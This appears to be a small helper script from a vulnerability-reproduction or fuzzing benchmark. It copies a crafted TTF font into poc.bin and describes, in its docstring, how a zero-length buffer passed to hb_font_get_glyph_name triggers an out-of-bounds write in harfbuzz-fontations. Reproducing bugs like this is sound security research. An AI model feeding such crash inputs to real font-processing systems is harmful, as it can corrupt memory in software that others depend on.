#!/usr/bin/env python3
"""Generate PoC for harfbuzz-fontations-oob-write.

The harness unconditionally calls hb_font_get_glyph_name(font, 0, buf,
0). Any valid font that gets past hb_face_create() triggers the bug;
we reuse the minimal TTF crafted for ots-processgeneric-npd.
"""
import shutil
from pathlib import Path

SOURCE = Path(__file__).resolve().parents[3] / "ots" / "ots-processgeneric-npd" / "poc" / "poc.bin"

def create_poc(output='poc.bin'):
    shutil.copy(SOURCE, output)
    print(f"wrote {output} ({Path(output).stat().st_size} bytes; from {SOURCE.name})")


if __name__ == '__main__':
    create_poc()
